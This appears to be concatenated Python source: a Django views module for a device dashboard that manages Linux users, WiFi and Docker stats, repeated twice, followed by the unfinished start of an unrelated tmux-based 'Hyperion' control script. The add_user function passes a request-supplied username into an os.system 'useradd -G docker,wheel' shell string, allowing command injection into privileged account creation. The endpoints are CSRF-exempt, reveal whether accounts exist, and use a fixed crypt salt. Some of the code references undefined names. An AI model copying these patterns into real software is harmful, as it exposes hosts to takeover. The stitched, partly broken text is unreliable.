from django.shortcuts import render
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt

from rest_framework.renderers import JSONRenderer
from rest_framework.parsers import JSONParser
from rest_framework.response import Response
from rest_framework import viewsets
from rest_framework.decorators import list_route
from flask import escape

from .models import BoxDetails, RegisteredServices
from .serializers import BoxDetailsSerializer, RegisteredServicesSerializer

import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd                     

# fetch network AP details
nm = NetworkManager.NetworkManager
wlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]

def get_osversion():
    """
    PRETTY_NAME of your Titania os (in lowercase).
    """
    with open("/etc/os-release") as f:
        osfilecontent = f.read().split("\n")
        # $PRETTY_NAME is at the 5th position
        version = osfilecontent[4].split('=')[1].strip('\"')
        return version

def get_allconfiguredwifi():
    """
    nmcli con | grep 802-11-wireless
    """
    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]
    wifirows = ps.split('\n')
    wifi = []
    for row in wifirows:
        name = row.split(':')
        print(name)
        wifi.append(name[0])
    return wifi

def get_allAPs():
    """
    nmcli con | grep 802-11-wireless
    """
    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]
    wifirows = ps.split('\n')
    wifi = []
    for row in wifirows:
        entry = row.split(':')
        print(entry)
        wifi.append(entry)
    return wifi
    # wifi_aps = []   
    # for dev in wlans:
    #     for ap in dev.AccessPoints:
    #         wifi_aps.append(ap.Ssid)
    # return wifi_aps

def add_user(username, password):
    encPass = crypt.crypt(password,"22")
    os.system("useradd -G docker,wheel -p "+encPass+" "+username)                    

def add_newWifiConn(wifiname, wifipass):
    print(wlans)
    wlan0 = wlans[0]
    print(wlan0)
    print(wifiname)
    # get selected ap as currentwifi
    for dev in wlans:
        for ap in dev.AccessPoints:
            if ap.Ssid == wifiname:
                currentwifi = ap
    print(currentwifi)
    # params to set password
    params = {
            "802-11-wireless": {
                "security": "802-11-wireless-security",
            },
            "802-11-wireless-security": {
                "key-mgmt": "wpa-psk",
                "psk": wifipass
            },
        }
    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        

def delete_WifiConn(wifiap):
    """
    nmcli connection delete id <connection name>
    """
    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)
    print(ps)

def edit_WifiConn(wifiname, wifipass):
    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)
    print(ps)
    print(wlans)
    wlan0 = wlans[0]
    print(wlan0)
    print(wifiname)
    # get selected ap as currentwifi
    for dev in wlans:
        for ap in dev.AccessPoints:
            if ap.Ssid == wifiname:
                currentwifi = ap
    # params to set password
    params = {
            "802-11-wireless": {
                "security": "802-11-wireless-security",
            },
            "802-11-wireless-security": {
                "key-mgmt": "wpa-psk",
                "psk": wifipass
            },
        }
    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) 
    return       

@csrf_exempt
def handle_config(request):
    """
    List all code snippets, or create a new snippet.
    """ 
    if request.method == 'POST':
        action = request.POST.get("_action")
        print(action)
        if action == 'registerService':
            request_name = request.POST.get("name")
            request_address = request.POST.get("address")
            request_icon = request.POST.get("icon")
            print(request_name)
            print(request_address)
            print(request_icon)
            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)
            return JsonResponse({"STATUS":"SUCCESS"}, safe=False)
        elif action == 'getSchema':
            schema = get_osversion()
            return JsonResponse({"version_info":schema}, safe=False)
        elif action == 'getIfConfigured':
            print(action)
            queryset = BoxDetails.objects.all()
            serializer = BoxDetailsSerializer(queryset, many=True)
            return JsonResponse(serializer.data, safe=False)
        elif action == 'loadDependencies':
            print(action)
            queryset = RegisteredServices.objects.all()
            serializer = RegisteredServicesSerializer(queryset, many=True)
            return JsonResponse(serializer.data, safe=False)
        elif action == 'getAllAPs':
            wifi_aps = get_allAPs()
            return JsonResponse(wifi_aps, safe=False)
        elif action == 'saveUserDetails':
            print(action)
            boxname = escape(request.POST.get("boxname"))
            username = escape(request.POST.get("username"))
            password = escape(request.POST.get("password"))
            print(username)
            add_user(username,password)
            setBoxName = BoxDetails(boxname=boxname)
            setBoxName.save()
            # connect to wifi ap user selected
            wifi_pass = request.POST.get("wifi_password")
            wifi_name = request.POST.get("wifi_ap")
            if len(wifi_name) > 0:
                add_newWifiConn(wifi_name,wifi_pass)
            return JsonResponse({"STATUS":"SUCCESS"}, safe=False)
        elif action == 'login':
            print(action)
            username = escape(request.POST.get("username"))
            password = escape(request.POST.get("password"))
            output=''
            """Tries to authenticate a user.
            Returns True if the authentication succeeds, else the reason
            (string) is returned."""
            try:
                enc_pwd = spwd.getspnam(username)[1]
                if enc_pwd in ["NP", "!", "", None]:
                    output = "User '%s' has no password set" % username
                if enc_pwd in ["LK", "*"]:
                    output = "account is locked"
                if enc_pwd == "!!":
                    output = "password has expired"
                # Encryption happens here, the hash is stripped from the
                # enc_pwd and the algorithm id and salt are used to encrypt
                # the password.
                if crypt.crypt(password, enc_pwd) == enc_pwd:
                    output = ''
                else:
                    output = "incorrect password"
            except KeyError:
                output = "User '%s' not found" % username
            if len(output) == 0:
                return JsonResponse({"username":username}, safe=False)
            else:
                return JsonResponse(output, safe=False)
        elif action == 'logout':
            print(action)
            username = request.POST.get("username")
            print(username+' ')
            queryset = User.objects.all().first()
            if username == queryset.username:
                return JsonResponse({"STATUS":"SUCCESS", "username":queryset.username}, safe=False)
        elif action == 'getDashboardCards':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_DASHBOARD_CARDS)
            rows = cursor.fetchall()
            print(rows)
            return JsonResponse(rows, safe=False)
        elif action == 'getDashboardChart':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            for row in rows:
                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])
                datasets = cursor.fetchall()
                print(datasets)
                data = {'container_name' : row[1], 'data': datasets}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getDockerOverview':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            for row in rows:
                data = {'state': row[0], 'container_id': row[1], 'name': row[2],
                        'image': row[3], 'running_for': row[4],
                        'command': row[5], 'ports': row[6],
                        'status': row[7], 'networks': row[8]}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getContainerStats':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            datasets_io = []
            datasets_mem = []
            datasets_perc = []
            for row in rows:
                datasets_io = []
                datasets_mem = []
                datasets_perc = []
                # values with % appended to them
                for iter in range(0,2):
                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_perc.append(counter_val)
                # values w/o % appended to them
                for iter in range(2,4):
                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_mem.append(counter_val)
                # values w/o % appended to them
                for iter in range(4,8):
                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_io.append(counter_val)
                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getThreads':
            print(action)
            rows = []
            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]
            processes = ps.decode().split('\n')
            # this specifies the number of splits, so the splitted lines
            # will have (nfields+1) elements
            nfields = len(processes[0].split()) - 1
            for row in processes[4:]:
                rows.append(row.split(None, nfields))
            return JsonResponse(rows, safe=False)
        elif action == 'getContainerTop':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            resultset = []
            for i in rows:
                data = {}
                datasets = []
                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]
                processes = ps.decode().split('\n')
                # this specifies the number of splits, so the splitted lines
                # will have (nfields+1) elements
                nfields = len(processes[0].split()) - 1
                for p in processes[1:]:
                    datasets.append(p.split(None, nfields))
                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}
                resultset.append(data)
            return JsonResponse(resultset, safe=False)
        elif action == 'getSettings':
            print(action)
            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = ps.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)
        elif action == 'deleteUser':
            print(action)
            username = escape(request.POST.get("user"))
            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)
        elif action == 'addNewUser':
            print(action)
            username = escape(request.POST.get("username"))
            password = escape(request.POST.get("password"))
            add_user(username,password)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)
        elif action == 'addWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_pass = escape(request.POST.get("wifi_password"))
            wifi_name = request.POST.get("wifi_ap")
            if len(wifi_name) > 0:
                add_newWifiConn(wifi_name,wifi_pass)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)
        elif action == 'deleteWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_name = request.POST.get("wifi")
            delete_WifiConn(wifi_name)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)
        elif action == 'editWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_name = request.POST.get("wifi_ap")
            wifi_pass = escape(request.POST.get("wifi_password"))
            edit_WifiConn(wifi_name,wifi_pass)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)
        return JsonResponse(serializer.errors, status=400)

def index(request):
    return render(request, 'index.html')

class BoxDetailsViewSet(viewsets.ModelViewSet):
    queryset = BoxDetails.objects.all()
    serializer_class = BoxDetailsSerializer

class RegisteredServicesViewSet(viewsets.ModelViewSet):
    queryset = RegisteredServices.objects.all()
    serializer_class = RegisteredServicesSerializer    



from django.shortcuts import render
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt

from rest_framework.renderers import JSONRenderer
from rest_framework.parsers import JSONParser
from rest_framework.response import Response
from rest_framework import viewsets
from rest_framework.decorators import list_route
from flask import escape

from .models import BoxDetails, RegisteredServices
from .serializers import BoxDetailsSerializer, RegisteredServicesSerializer

import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd                     

# fetch network AP details
nm = NetworkManager.NetworkManager
wlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]

def get_osversion():
    """
    PRETTY_NAME of your Titania os (in lowercase).
    """
    with open("/etc/os-release") as f:
        osfilecontent = f.read().split("\n")
        # $PRETTY_NAME is at the 5th position
        version = osfilecontent[4].split('=')[1].strip('\"')
        return version

def get_allconfiguredwifi():
    """
    nmcli con | grep 802-11-wireless
    """
    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]
    wifirows = ps.split('\n')
    wifi = []
    for row in wifirows:
        name = row.split(':')
        print(name)
        wifi.append(name[0])
    return wifi

def get_allAPs():
    """
    nmcli con | grep 802-11-wireless
    """
    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]
    wifirows = ps.split('\n')
    wifi = []
    for row in wifirows:
        entry = row.split(':')
        print(entry)
        wifi.append(entry)
    return wifi
    # wifi_aps = []   
    # for dev in wlans:
    #     for ap in dev.AccessPoints:
    #         wifi_aps.append(ap.Ssid)
    # return wifi_aps

def add_user(username, password):
    encPass = crypt.crypt(password,"22")
    os.system("useradd -G docker,wheel -p "+encPass+" "+username)                    

def add_newWifiConn(wifiname, wifipass):
    print(wlans)
    wlan0 = wlans[0]
    print(wlan0)
    print(wifiname)
    # get selected ap as currentwifi
    for dev in wlans:
        for ap in dev.AccessPoints:
            if ap.Ssid == wifiname:
                currentwifi = ap
    print(currentwifi)
    # params to set password
    params = {
            "802-11-wireless": {
                "security": "802-11-wireless-security",
            },
            "802-11-wireless-security": {
                "key-mgmt": "wpa-psk",
                "psk": wifipass
            },
        }
    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        

def delete_WifiConn(wifiap):
    """
    nmcli connection delete id <connection name>
    """
    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)
    print(ps)

def edit_WifiConn(wifiname, wifipass):
    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)
    print(ps)
    print(wlans)
    wlan0 = wlans[0]
    print(wlan0)
    print(wifiname)
    # get selected ap as currentwifi
    for dev in wlans:
        for ap in dev.AccessPoints:
            if ap.Ssid == wifiname:
                currentwifi = ap
    # params to set password
    params = {
            "802-11-wireless": {
                "security": "802-11-wireless-security",
            },
            "802-11-wireless-security": {
                "key-mgmt": "wpa-psk",
                "psk": wifipass
            },
        }
    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) 
    return       

@csrf_exempt
def handle_config(request):
    """
    List all code snippets, or create a new snippet.
    """ 
    if request.method == 'POST':
        action = request.POST.get("_action")
        print(action)
        if action == 'registerService':
            request_name = request.POST.get("name")
            request_address = request.POST.get("address")
            request_icon = request.POST.get("icon")
            print(request_name)
            print(request_address)
            print(request_icon)
            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)
            return JsonResponse({"STATUS":"SUCCESS"}, safe=False)
        elif action == 'getSchema':
            schema = get_osversion()
            return JsonResponse({"version_info":schema}, safe=False)
        elif action == 'getIfConfigured':
            print(action)
            queryset = BoxDetails.objects.all()
            serializer = BoxDetailsSerializer(queryset, many=True)
            return JsonResponse(serializer.data, safe=False)
        elif action == 'loadDependencies':
            print(action)
            queryset = RegisteredServices.objects.all()
            serializer = RegisteredServicesSerializer(queryset, many=True)
            return JsonResponse(serializer.data, safe=False)
        elif action == 'getAllAPs':
            wifi_aps = get_allAPs()
            return JsonResponse(wifi_aps, safe=False)
        elif action == 'saveUserDetails':
            print(action)
            boxname = escape(request.POST.get("boxname"))
            username = escape(request.POST.get("username"))
            password = escape(request.POST.get("password"))
            print(username)
            add_user(username,password)
            setBoxName = BoxDetails(boxname=boxname)
            setBoxName.save()
            # connect to wifi ap user selected
            wifi_pass = request.POST.get("wifi_password")
            wifi_name = request.POST.get("wifi_ap")
            if len(wifi_name) > 0:
                add_newWifiConn(wifi_name,wifi_pass)
            return JsonResponse({"STATUS":"SUCCESS"}, safe=False)
        elif action == 'login':
            print(action)
            username = escape(request.POST.get("username"))
            password = escape(request.POST.get("password"))
            output=''
            """Tries to authenticate a user.
            Returns True if the authentication succeeds, else the reason
            (string) is returned."""
            try:
                enc_pwd = spwd.getspnam(username)[1]
                if enc_pwd in ["NP", "!", "", None]:
                    output = "User '%s' has no password set" % username
                if enc_pwd in ["LK", "*"]:
                    output = "account is locked"
                if enc_pwd == "!!":
                    output = "password has expired"
                # Encryption happens here, the hash is stripped from the
                # enc_pwd and the algorithm id and salt are used to encrypt
                # the password.
                if crypt.crypt(password, enc_pwd) == enc_pwd:
                    output = ''
                else:
                    output = "incorrect password"
            except KeyError:
                output = "User '%s' not found" % username
            if len(output) == 0:
                return JsonResponse({"username":username}, safe=False)
            else:
                return JsonResponse(output, safe=False)
        elif action == 'logout':
            print(action)
            username = request.POST.get("username")
            print(username+' ')
            queryset = User.objects.all().first()
            if username == queryset.username:
                return JsonResponse({"STATUS":"SUCCESS", "username":queryset.username}, safe=False)
        elif action == 'getDashboardCards':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_DASHBOARD_CARDS)
            rows = cursor.fetchall()
            print(rows)
            return JsonResponse(rows, safe=False)
        elif action == 'getDashboardChart':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            for row in rows:
                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])
                datasets = cursor.fetchall()
                print(datasets)
                data = {'container_name' : row[1], 'data': datasets}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getDockerOverview':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            for row in rows:
                data = {'state': row[0], 'container_id': row[1], 'name': row[2],
                        'image': row[3], 'running_for': row[4],
                        'command': row[5], 'ports': row[6],
                        'status': row[7], 'networks': row[8]}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getContainerStats':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            datasets_io = []
            datasets_mem = []
            datasets_perc = []
            for row in rows:
                datasets_io = []
                datasets_mem = []
                datasets_perc = []
                # values with % appended to them
                for iter in range(0,2):
                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_perc.append(counter_val)
                # values w/o % appended to them
                for iter in range(2,4):
                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_mem.append(counter_val)
                # values w/o % appended to them
                for iter in range(4,8):
                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_io.append(counter_val)
                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getThreads':
            print(action)
            rows = []
            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]
            processes = ps.decode().split('\n')
            # this specifies the number of splits, so the splitted lines
            # will have (nfields+1) elements
            nfields = len(processes[0].split()) - 1
            for row in processes[4:]:
                rows.append(row.split(None, nfields))
            return JsonResponse(rows, safe=False)
        elif action == 'getContainerTop':
            print(action)
            con = sqlite3.connect("dashboard.sqlite3")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            resultset = []
            for i in rows:
                data = {}
                datasets = []
                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]
                processes = ps.decode().split('\n')
                # this specifies the number of splits, so the splitted lines
                # will have (nfields+1) elements
                nfields = len(processes[0].split()) - 1
                for p in processes[1:]:
                    datasets.append(p.split(None, nfields))
                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}
                resultset.append(data)
            return JsonResponse(resultset, safe=False)
        elif action == 'getSettings':
            print(action)
            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = ps.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)
        elif action == 'deleteUser':
            print(action)
            username = escape(request.POST.get("user"))
            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)
        elif action == 'addNewUser':
            print(action)
            username = escape(request.POST.get("username"))
            password = escape(request.POST.get("password"))
            add_user(username,password)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)
        elif action == 'addWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_pass = escape(request.POST.get("wifi_password"))
            wifi_name = request.POST.get("wifi_ap")
            if len(wifi_name) > 0:
                add_newWifiConn(wifi_name,wifi_pass)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)
        elif action == 'deleteWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_name = request.POST.get("wifi")
            delete_WifiConn(wifi_name)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)
        elif action == 'editWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_name = request.POST.get("wifi_ap")
            wifi_pass = escape(request.POST.get("wifi_password"))
            edit_WifiConn(wifi_name,wifi_pass)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)
        return JsonResponse(serializer.errors, status=400)

def index(request):
    return render(request, 'index.html')

class BoxDetailsViewSet(viewsets.ModelViewSet):
    queryset = BoxDetails.objects.all()
    serializer_class = BoxDetailsSerializer

class RegisteredServicesViewSet(viewsets.ModelViewSet):
    queryset = RegisteredServices.objects.all()
    serializer_class = RegisteredServicesSerializer    



#! /usr/bin/env python
from libtmux import Server
from yaml import load, dump
from setupParser import Loader
from DepTree import Node, dep_resolve, CircularReferenceException
import logging
import os
import socket
import argparse
from psutil import Process
from subprocess import call
from graphviz import Digraph
from enum import Enum
from time import sleep

import sys
from PyQt4 import QtGui
import hyperGUI

FORMAT = "%(asctime)s: %(name)s [%(levelname)s]:\t%(message)s"

logging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')
TMP_SLAVE_DIR = "/tmp/Hyperion/slave/components"
TMP_COMP_DIR = "/tmp/Hyperion/components"
TMP_LOG_PATH = "/tmp/Hyperion/log"

BASE_DIR = os.path.dirname(__file__)
SCRIPT_CLONE_PATH = ("%s/scripts/start_named_clone_session.sh" % BASE_DIR)


class CheckState(Enum):
    RUNNING = 0
    STOPPED = 1
    STOPPED_BUT_SUCCESSFUL = 2
    STARTED_BY_HAND = 3
    DEP_FAILED = 4


class ControlCenter:

    def __init__(self, configfile=None):
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        self.configfile = configfile
        self.nodes = {}
        self.server = []
        self.host_list = []

        if configfile:
            self.load_config(configfile)
            self.session_name = self.config["name"]

            # Debug write resulting yaml file
            with open('debug-result.yml', 'w') as outfile:
                dump(self.config, outfile, default_flow_style=False)
            self.logger.debug("Loading config was successful")

            self.server = Server()

            if self.server.has_session(self.session_name):
                self.session = self.server.find_where({
                    "session_name": self.session_name
                })

                self.logger.info('found running session by name "%s" on server' % self.session_name)
            else:
                self.logger.info('starting new session by name "%s" on server' % self.session_name)
                self.session = self.server.new_session(
                    session_name=self.session_name,
                    window_name="Main"
                )
        else:
            self.config = None

    ###################
    # Setup
    ###################
    def load_config(self, filename="default.yaml"):
        with open(filename) as data_file:
            self.config = load(data_file, Loader)

    def init(self):
        if not self.config:
            self.logger.error(" Config not loaded yet!")

        else:
            for group in self.config['groups']:
                for comp in group['components']:
                    self.logger.debug("Checking component '%s' in group '%s' on host '%s'" %
                                      (comp['name'], group['name'], comp['host']))

                    if comp['host'] != "localhost" and not self.run_on_localhost(comp):
                        self.copy_component_to_remote(comp, comp['name'], comp['host'])

            # Remove duplicate hosts
            self.host_list = list(set(self.host_list))

            self.set_dependencies(True)

    def set_dependencies(self, exit_on_fail):
        for group in self.config['groups']:
            for comp in group['components']:
                self.nodes[comp['name']] = Node(comp)

        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all
        # nodes with simple algorithms
        master_node = Node({'name': 'master_node'})
        for name in self.nodes:
            node = self.nodes.get(name)

            # Add edges from each node to pseudo node
            master_node.addEdge(node)

            # Add edges based on dependencies specified in the configuration
            if "depends" in node.component:
                for dep in node.component['depends']:
                    if dep in self.nodes:
                        node.addEdge(self.nodes[dep])
                    else:
                        self.logger.error("Unmet dependency: '%s' for component '%s'!" % (dep, node.comp_name))
                        if exit_on_fail:
                            exit(1)
        self.nodes['master_node'] = master_node

        # Test if starting all components is possible
